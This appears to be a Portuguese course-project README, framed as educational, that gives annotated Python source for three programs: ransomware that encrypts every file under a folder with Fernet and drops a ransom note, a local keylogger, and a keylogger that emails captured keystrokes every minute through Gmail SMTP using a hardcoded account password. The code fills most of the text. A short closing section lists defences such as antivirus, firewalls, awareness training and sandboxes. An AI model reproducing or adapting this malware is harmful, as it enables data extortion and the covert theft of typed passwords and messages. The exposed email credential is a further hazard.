# keylogger-e-Ransomware
esse repositório contém as informações presentes em todo o meu processo de aprendizado no último curso disponibilizado pela DIO , apresentado os passos aos quais eu segui para realizar todos esses testets de forma segura e com caráter educacional .

O texto contém explicações dentro das chaves {} , para que não haja confusão com oque seria o comando .


#1. Ransomware 
from cryptograpy.fernet import fernet {importa o módulo Fernet para criptografia}
import os {navega entre as pastas , encontra os arquivos e montar caminhos de diretório}

1. Gerar a chave

def gerar chave 
    chave = Fernet.generate_key( Gera uma chave de 32 bytes)
    with open("chave.key", "wb") as chave_file:  {abre um arquivo para gravar em binário)
        chave_file.write(chave) {salva a chave no arquivo)

2. Carregar a chave


def carregar_chave(): 
    return open("chave.key", "rb").read() {abre o chave.key , lê a chave armazenada , retorna a chave para ser usada}

3. Criptografar um único arquivo


def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave) {cria um objeto de criptografia com a chave
    with open(arquivo, "rb") as file: {abre o arquivo original}
        dados = file.read() {l~e os bytes do arquivo}
    dados_encriptados = f.encrypt(dados) {criptografia o conteúdo }
    with open(arquivo, "wb") as file: {reabre o arquivo para sobreescrever}
        file.write(dados_encriptados) {substitui o arquivo criptografado}

4. Encontrar arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio): {passa por todas as pastas e subpastas}
        for nome in arquivos: {lista todos os arquivos encontrados}
            caminho = os.path.join(raiz, nome) {monta o caminho completo do arquivo}
            if nome != "ransomware.py" and not nome.endswith(".key"): {evita a criptografia do próprio ransomware}
                lista.append(caminho) {adiciona caminho à lista final}
    return lista

5. Criar a mensagem de resgate {deixa as instruções sobre o ataque e requisitos}

def criar_mensagem_resgate():
    with open("LEIA ISSO.TXT", "w") as f:
        f.write("Sua máquina foi criptografada !\n")
        f.write("para recuperar seus arquivos mande 1 bitcoin ao email x e comprovante \n")
        f.write("depois disso eu envio a chave burrão\n")

Execução principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test-files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransomware executado! Arquivos criptografados!")


7> Rodar o programa
if __name__ == "__main__":
    main()

 PC C: >python .\ransoware


 

#2.Keylogger

from pynput import keyboard {importa o módulo keyboard da biblioteca pynput}

IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,  {conjunto de set com teclas que não vão ser registradas}
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
}
             
def on_press(key): {função ativada ao alguma tecla ser pressionada} 
    try:
        # se for uma tecla "normal" (letra, número, símbolo) 
        with open("log.txt","a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # se for uma tecla especial (espaço, enter, etc.)
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ") # Adicionado espaço entre aspas
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("") # Deixado vazio para não registrar nada, ou poderia ser "[BACKSPACE]"
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass # Não faz nada se a tecla estiver na lista de ignorar
            else:
                f.write(f"[{key}] ")

# Inicia o listener do teclado (parte que inicia a captura de teclas)
with keyboard.Listener(on_press=on_press) as listener: (impede o programa de terminar)
     listener.join() {abre o scrip e fecha imediatamente]

     

#3. Keylogger com acesso a um email que vai receber os registros em um determinado tempo.

from pynput import keyboard {captura de teclas}
import smtplib {envia para o e_mail}
from email.mime.text import MIMEText {formata o texto do e-mail}
from threading import Timer {determina o tempo para o envio das mensagens}

# CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "testedio2025@gmail.com"
EMAIL_DESTINO = "testedio2025@gmail.com"
SENHA_EMAIL = "avjk lus ayt pqf"

log = ""  # Variável global para armazenar o que foi digitado

def enviar_email(): {envia o e-mail de forma automática}
    global log

    if log:  # Só envia se tiver conteúdo
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try: {conexão com o servidor do Gmail}
            server = smtplib.SMTP("smtp.gmail.com", 587) {servidor oficial e porta de conexão STARTTLS}
            server.starttls() {conexão TLS}
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar:", e) {caso de algum erro manda essa mensagem}

        log = ""  # limpa o conteúdo após enviar

    # agendar novamente o envio automático
    Timer(60, enviar_email).start()


def on_press(key): {captura de teclas}
    global log

    try:
        log += key.char
    except AttributeError: {caso seja utiliza alguma tecla especial}
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass  # ignora outras teclas especiais


# Inicia o keylogger + envio automático
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()


#4. Formas de defesa eficientes .

antivírus/firewalls(sistema/rede) keylogger {SMTP}
Monitoramento de aplicativos [detecção por comportamento]
engenharia social
ambiente isolado para testes (sandbox/VM)

(1) Antivírus/Firewalls para sistema e rede 

antivírus endpoint protection: detecta possíveis riscos por meio de registro de assinatura , análise comportamental e monitoramento constante de processos.

-Keylogger: bloqueia programas que tentam captura de tela, impede a instalação de malwares por qualquer meio 

-Ransomware: detecta a criptografia em massa , interrompre processos que estão realizando modificações de forma acelerada e consegue recuperar arquivos com proteções de pastas.

Firewall: meio que tem um controle sobre processos de entrada e saída da máquina , auxiliando no monitoramento e é necessário uma boa configuração. 

-keylogger : bloqueio o envio de dados as servidores externos (SMTP/C2...), impede o envio de capturas de keyloggers por (e-mail/HTTP/UDP...) e bloqueia uso de conexões reversas de keyloggers .


-ransomware : impede a propagação por meio da rede e impede o dowload automático. 

(2) Engenharia Social

Meio de exploração mais comum visto nos últimos anos e muitas vezes tendo o como alvo um elo mais fraco de toda uma cadeia , um funcionário mal intencionado ou apenas leigo das mazelas que tais descuidos podem gerar.

Explicações necessárias que devem ser explicadas a todos os colaboradores para evitar em falhas na segurança . 


Evita clicar em links falsos que instalam malwares de qualquer tipo.

Evita baixar anexos sem ter a certeza de seu conteudo em PDF, ZIP, DOCX.

Evita instalar softwares de formas que não sejam da distribuição original.

Analisar site para que não caia em um redirecionamento para algum acesso de phising/Spoofed/Typosquatting/Homograph.

Impede que forneça acesso remoto para desconhecidos.



(3) Utilização de ambiente isolado para análise do malware:

Caso tenha tido uma quebra dos protocolos de segurança é necessário uma análise maior do problema , para isso se utilizam de  VM(Virtual Machines) ou sandbox cria um ambiente onde o malware:

Não atinge o sistema real da máquina
não tem a disponibilidade do HD 
não tem como escalar privilégios
não pode ver nem infectar outras máquinas por meio da rede
e pode ser resetado por meio de snapshots


